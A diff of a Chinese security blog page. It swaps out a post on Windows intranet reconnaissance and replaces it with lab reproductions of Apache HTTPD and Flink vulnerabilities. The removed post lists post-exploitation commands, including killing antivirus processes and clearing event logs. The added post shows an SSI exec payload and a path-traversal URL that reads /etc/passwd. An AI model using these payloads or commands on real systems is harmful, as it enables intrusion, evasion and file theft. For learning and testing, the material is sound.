@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网信息收集, obelia">
+    <meta name="keywords" content="Apache 漏洞, obelia">
     <meta name="description" content="菜🐔一枚，大哥带带？">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网信息收集 | obelia</title>
+    <title>Apache 漏洞 | obelia</title>
     <link rel="icon" type="image/png" href="/1.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网信息收集</h1>
+                    <h1 class="description center-align post-title">Apache 漏洞</h1>
                 </div>
             </div>
         </div>
@@ -324,12 +324,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91/">
-                                <span class="chip bg-color">内网</span>
+                            <a href="/tags/WEB/">
+                                <span class="chip bg-color">WEB</span>
                             </a>
                         
-                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                <span class="chip bg-color">信息收集</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -344,7 +344,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-20
+                    2021-06-01
                 </div>
                 
 
@@ -358,14 +358,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    848
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    3 分
                 </div>
                 
 
@@ -388,196 +388,59 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><span id="more"></span>
-<h2 id="1-WMIC-基础语法"><a href="#1-WMIC-基础语法" class="headerlink" title="1.WMIC 基础语法"></a>1.WMIC 基础语法</h2><h3 id="1-1-语法介绍"><a href="#1-1-语法介绍" class="headerlink" title="1.1 语法介绍"></a>1.1 语法介绍</h3><p>wmic命令行是用来管理WMI系统的， 算是win的插件 ， 用户可以使用 WMI 管理本地和远程计算机。</p>
-<p>WMI在渗透测试中不需要下载和安装，是Windows系统自带功能，和cmd一样用</p>
-<p>在整个运行过程都在计算机内存中发生，不会留下任何操作痕迹。</p>
-<h3 id="1-2-简单实用"><a href="#1-2-简单实用" class="headerlink" title="1.2 简单实用"></a>1.2 简单实用</h3><h4 id="1-2-1-查看帮助"><a href="#1-2-1-查看帮助" class="headerlink" title="1.2.1 查看帮助"></a>1.2.1 查看帮助</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wmic &#x2F;?  #查看全局命令
-process &#x2F;? #进程管理帮助
-wmic process get &#x2F;?   #属性获取操作帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+                <h1 id="Apache漏洞"><a href="#Apache漏洞" class="headerlink" title="Apache漏洞"></a>Apache漏洞</h1><span id="more"></span>
+<h2 id="1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略</p>
+<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)漏洞复现"></a>2)漏洞复现</h3><p>上传正常php文件截图</p>
+<img src="/2021/06/01/apache-lou-dong/img-1.png" class="slug">
+<p>修改方框处 ，增加 hex码 0a</p>
+<img src="/2021/06/01/apache-lou-dong/img-2.png" class="slug">
+<p>文件上传成功，访问 <a target="_blank" rel="noopener" href="http://172.16.97.2:8080/evil.php%0a">http://172.16.97.2:8080/evil.php%0a</a> 发现上传成功</p>
+<img src="/2021/06/01/apache-lou-dong/img-3.png" class="slug">
+<h2 id="1-2Apache-HTTPD-多后缀解析漏洞"><a href="#1-2Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="1.2Apache HTTPD 多后缀解析漏洞"></a>1.2Apache HTTPD 多后缀解析漏洞</h2><h3 id="1）漏洞原理"><a href="#1）漏洞原理" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">AddType text&#x2F;html .html
+AddLanguage zh-CN .cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h4 id="1-2-2-常用命令"><a href="#1-2-2-常用命令" class="headerlink" title="1.2.2 常用命令"></a>1.2.2 常用命令</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取系统正在运行的进程、进程文件的路径、进程ID
-wmic process get caption,executablepath,processid
+<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
+<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
+<pre class="line-numbers language-none"><code class="language-none">AddHandler application&#x2F;x-httpd-php .php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-#获取系统当前正在运行的服务
-wmic service where (state&#x3D;&#39;runing&#39;) get name,processid,pathname,startmode,caption
+<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞</p>
+<h3 id="2）漏洞复现"><a href="#2）漏洞复现" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p>
+<p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell</p>
+<img src="/2021/06/01/apache-lou-dong/img-4.png" class="slug">
+<h2 id="1-3-Apache-SSI-远程命令执行漏洞"><a href="#1-3-Apache-SSI-远程命令执行漏洞" class="headerlink" title="1.3 Apache SSI 远程命令执行漏洞"></a>1.3 Apache SSI 远程命令执行漏洞</h2><h3 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
+<h3 id="2）漏洞复现-1"><a href="#2）漏洞复现-1" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
+<pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-#查看服务信息
-wmic service list brief
-
-#获取杀软详情
-wmic &#x2F;Node:localhost &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe &#x2F;Format:List
-
-#获取补丁信息
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-
-#判断是否是虚拟机
-wmic onboarddevice get Description,DeviceType,Enabled,Status &#x2F;format:list
-
-#安装了那些软件
-wmic product get name,version
-
-#获取本地安装程序
-wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name &#x2F;FORMAT:table
-
-#系统环境变量
-wmic environment get Description,VariableValue
-
-#计算机品牌，型号、名称、名字
-wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:list
-
-#获取系统驱动情况
-wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status &#x2F;format:list
-#查看驱动器
-wmic logicaldisk get caption,description,providername  
-
-#查看当前操作系统
-wmic OS get Caption,CSDVersion,OSArchitecture,Version
-
-#查看开机自启动
-wmic startup get caption,command
-
-#查看共享文件
-wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="1-2-3-操作用户"><a href="#1-2-3-操作用户" class="headerlink" title="1.2.3 操作用户"></a>1.2.3 操作用户</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#搜索用户账户
-wmic useraccount list brief
-#锁定用户账号
-wmic useraccount where name&#x3D;&#39;hacker&#39; set disabled&#x3D;false
-#用户账号重命名
-wmic useraccount where name&#x3D;&#39;hacker&#39; rename hacker
-#限制用户修改密码
-wmic useraccount where name&#x3D;&#39;hacker&#39; set passwordchangeable&#x3D;false
-#搜索登录用户
-wmic logon list brief
-#搜索计算机域控制器
-wmic ntdomain list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="1-2-4-操作服务"><a href="#1-2-4-操作服务" class="headerlink" title="1.2.4 操作服务"></a>1.2.4 操作服务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#卸载和重装程序
-wmic product where &quot;name like &#39;%forit%&#39;&quot; get name
-
-#停止运行服务,主要是关闭杀软
-Wmic process where name&#x3D;&quot;XXX.exe&quot; call terminate
-wmic process where name&#x3D;&quot;explorer.exe&quot; call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="1-2-5-清理日志"><a href="#1-2-5-清理日志" class="headerlink" title="1.2.5 清理日志"></a>1.2.5 清理日志</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wmic nteventlog where filename&#x3D;&#39;system&#39; cleareventlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="2-本机信息"><a href="#2-本机信息" class="headerlink" title="2.  本机信息"></a>2.  本机信息</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>当主机上线时候，第一件事就是搜集有用信息，判断这是什么系统、找杀软、找漏洞来提权、判断内网等等。</p>
-<p>而不是无头苍蝇，上来就乱搞一通。</p>
-<h3 id="2-2-命令"><a href="#2-2-命令" class="headerlink" title="2.2 命令"></a>2.2 命令</h3><h4 id="2-2-1-系统与配置信息"><a href="#2-2-1-系统与配置信息" class="headerlink" title="2.2.1 系统与配置信息"></a>2.2.1 系统与配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主机信息
-hostname 
-
-#查看当前操作系统，重点查看版本、位数、补丁信息
-systeminfo 
-systeminfo | findstr &#x2F;B &#x2F;C:&quot;Os Name&quot; &#x2F;C:&quot;OS Version&quot;
-
-#查看系统架构
-echo %PROCESSOR_ARCHITECTURE%
-
-#查看驱动情况
-DRIVERQUERY
-#查看磁盘驱动器，有几个磁盘
-wmic logicaldisk get caption,description,providername
-
-#host 信息
-type C:\\windows\system32\drivers\etc\hosts
-
-#如果安装iis服务器可以查看iis配置信息
-type C:\\windows\system32\inetsrv\config\applicationHost.config
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-2-2-软件与进程信息"><a href="#2-2-2-软件与进程信息" class="headerlink" title="2.2.2 软件与进程信息"></a>2.2.2 软件与进程信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主要是看安装软件和版本信息，查响应版本漏洞
-wmic product get name,version
-#查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀软等
-tasklist &#x2F;svc
-wmic process list brief
-#查看AV安装情况
-wmic &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List
-#已启动程序的信息，查看开机自启动
-wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-2-3-服务信息"><a href="#2-2-3-服务信息" class="headerlink" title="2.2.3 服务信息"></a>2.2.3 服务信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看启动的服务
-net start
-#查看服务信息
-q
-#查询服务的详细信息
-sc querys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-2-4-计划任务"><a href="#2-2-4-计划任务" class="headerlink" title="2.2.4 计划任务"></a>2.2.4 计划任务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">schtasks #计划任务
-参考参数
-&#x2F;Create  # 创建计划任务
-&#x2F;Delete  #删除计划任务
-&#x2F;Query #显示所有的计划任务
-&#x2F;Change  #更改计划任务
-&#x2F;Run。# 运行计划任务
-&#x2F;End。#终止当前计划任务
-&#x2F;ShowSid  #显示与计划任务名称相应的安全标识符
-&#x2F;？  #显示此帮助消息
-
-#查询所有的计划任务
-schtasks &#x2F;query &#x2F;fo list &#x2F;v
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-2-5-用户信息"><a href="#2-2-5-用户信息" class="headerlink" title="2.2.5 用户信息"></a>2.2.5 用户信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看主机开机时间
-net statistics workstation
-#查询已经在线用户，注意管理员是否在线
-query user || qwinsta
-query session 
-#查看当前用户权限，主要是判断现在是本地平台用户、本地管理员、还是域内用户
-whoami
-whoami &#x2F;all
-# 查看本地用户列表，推测命名规则
-net user
-#查看所有组名，
-net localgroup
-#然后可以查看指定组中的成员列表，比如查询本地管理员组看到本地一个管理员，还一个域的Domainadmins为域内机器的本地管理员用户
-net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-2-6-网络配置信息"><a href="#2-2-6-网络配置信息" class="headerlink" title="2.2.6 网络配置信息"></a>2.2.6 网络配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看网络信息
-ipconfig &#x2F;all
-#查看路由器和路由表，可以判断内网的地址段
-route print
-arp -A
-#查看主机共享列表，可访问的共享列表
-net share
-wmic share get name,path,status
-#查看主机开放端口以及链接状态，TCP&#x2F;UDP
-netstat -ano
-netstat -anob #查看对应的程序，需要权限
-
-#通过注册表查看代理情况
-REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="3域信息收集"><a href="#3域信息收集" class="headerlink" title="3域信息收集"></a>3域信息收集</h2><h3 id="3-1-域内信息收集"><a href="#3-1-域内信息收集" class="headerlink" title="3.1 域内信息收集"></a>3.1 域内信息收集</h3><h4 id="3-1-1主机信息收集"><a href="#3-1-1主机信息收集" class="headerlink" title="3.1.1主机信息收集"></a>3.1.1主机信息收集</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell systeminfo #查看主机信息，存在域信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="/2021/04/20/nei-wang-xin-xi-shou-ji/img-1.png" class="slug">
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取域名ip
-shell nslookup god.org
-ping god.org 
-
-#查询当前会话登陆的是域还是本地工作组，是域的话可以查DNS和域用户信息
-shell config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/2021/04/20/nei-wang-xin-xi-shou-ji/img-2.png" class="slug">
-<h4 id="3-1-2域基本信息查询"><a href="#3-1-2域基本信息查询" class="headerlink" title="3.1.2域基本信息查询"></a>3.1.2域基本信息查询</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell net view #查看工作组内主机
-shell net view&#x2F;domain #查看有几个域
-shell net view&#x2F;domain：god.org  #查看指定域内主机
-shell net accounts &#x2F;domain   #获取域密码策略
-shell nltest &#x2F;domain_trusts #获取域信任信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="3-1-3-域内用户和管理员信息"><a href="#3-1-3-域内用户和管理员信息" class="headerlink" title="3.1.3.域内用户和管理员信息"></a>3.1.3.域内用户和管理员信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net user &#x2F;domain #查询域内用户列表
-net user Administrator &#x2F;domamin # 查询指定域用户信息
-net group &#x2F;doamin  #查看域内的组，判断每个组的功能
-net group &quot;domain admins&quot; &#x2F;domain #查询域管理员组内的用户
-net group &quot;Domain computers&quot; &#x2F;domain  #查询域成员计算机列表，对应的是主机的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="3-1-4判断主域（域控）"><a href="#3-1-4判断主域（域控）" class="headerlink" title="3.1.4判断主域（域控）"></a>3.1.4判断主域（域控）</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net time &#x2F;domain #域服务器一般会作为时间服务器使用，就可以获得域控地址存在域，但当前用户不是域用户会拒绝访问；是域用户就获得相应地址；显示找不到域则是工作组环境
-ping DC.domain.test #通过ping获取域控
-nltest &#x2F;DCLIST:domain
-netdom query pdc
-net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="/2021/06/01/apache-lou-dong/img-5.png" class="slug">
+<p>访问当前路径即可rce</p>
+<img src="/2021/06/01/apache-lou-dong/img-6.png" class="slug">
 
 
+<h2 id="1-4-Apache-Flink上传路径遍历（CVE-2020-17518）"><a href="#1-4-Apache-Flink上传路径遍历（CVE-2020-17518）" class="headerlink" title="1.4 Apache Flink上传路径遍历（CVE-2020-17518）"></a>1.4 Apache Flink上传路径遍历（CVE-2020-17518）</h2><h3 id="1）漏洞原理-1"><a href="#1）漏洞原理-1" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p>
+<p>Apache Flink 1.5.1引入了REST处理程序，该处理程序允许您通过恶意修改的HTTP HEADER将上传的文件写入本地文件系统上的任意位置。</p>
+<h3 id="2）漏洞复现-2"><a href="#2）漏洞复现-2" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>搭建完成</p>
+<img src="/2021/06/01/apache-lou-dong/img-7.png" class="slug">
+<p>访问submit New JOB 并且上传文件，在文件名处进行路径穿透</p>
+<img src="/2021/06/01/apache-lou-dong/img-8.png" class="slug">
+<p>上传成功</p>
+<img src="/2021/06/01/apache-lou-dong/img-9.png" class="slug">
+
+
+<h2 id="1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）"><a href="#1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）" class="headerlink" title="1.5 Apache Flinkjobmanager/logs路径遍历（CVE-2020-17519）"></a>1.5 Apache Flink<code>jobmanager/logs</code>路径遍历（CVE-2020-17519）</h2><h3 id="1-漏洞原理-2"><a href="#1-漏洞原理-2" class="headerlink" title="1) 漏洞原理"></a>1) 漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p>
+<p>Apache Flink 1.11.0中引入的一项更改（以及1.11.1和1.11.2中也发布）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801">https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-17519">https://nvd.nist.gov/vuln/detail/CVE-2020-17519</a></li>
+</ul>
+<h3 id="2）漏洞复现-3"><a href="#2）漏洞复现-3" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问当前路径</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">http://172.16.97.2:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2021/06/01/apache-lou-dong/img-10.png" class="slug">
+
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4>
                 
             </div>
             <hr/>
@@ -603,7 +466,7 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://obelia.ml/2021/04/20/nei-wang-xin-xi-shou-ji/">http://obelia.ml/2021/04/20/nei-wang-xin-xi-shou-ji/</a>
+                    <a href="http://obelia.ml/2021/06/01/apache-lou-dong/">http://obelia.ml/2021/06/01/apache-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -641,12 +504,12 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91/">
-                                    <span class="chip bg-color">内网</span>
+                                <a href="/tags/WEB/">
+                                    <span class="chip bg-color">WEB</span>
                                 </a>
                             
-                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                    <span class="chip bg-color">信息收集</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
                         </div>
@@ -818,29 +681,30 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/05/27/yu-ming-dns-pei-zhi/">
+                <a href="/2021/06/01/apache-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="域名/DNS 配置">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Apache 漏洞">
                         
-                        <span class="card-title">域名/DNS 配置</span>
+                        <span class="card-title">Apache 漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            域名/DNS 相关配置
+                            Apache漏洞
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -849,15 +713,16 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%85%8D%E7%BD%AE/">
-                        <span class="chip bg-color">配置</span>
+                    <a href="/tags/WEB/">
+                        <span class="chip bg-color">WEB</span>
                     </a>
                     
-                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
-                        <span class="chip bg-color">服务器</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -871,24 +736,24 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/27/iterm2-pei-zhi/">
+                <a href="/2021/05/31/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="iterm2配置">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Msfvenmon常用命令/Meterpreter后渗透常用命令">
                         
-                        <span class="card-title">iterm2配置</span>
+                        <span class="card-title">Msfvenmon常用命令/Meterpreter后渗透常用命令</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ITerm2 配置
+                            Meterpreter后渗透常用命令
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-31
                             </span>
                         <span class="publish-author">
                             
@@ -901,12 +766,12 @@ net group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%85%8D%E7%BD%AE/">
-                        <span class="chip bg-color">配置</span>
+                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
+                        <span class="chip bg-color">工具</span>
                     </a>
                     
-                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
-                        <span class="chip bg-color">服务器</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
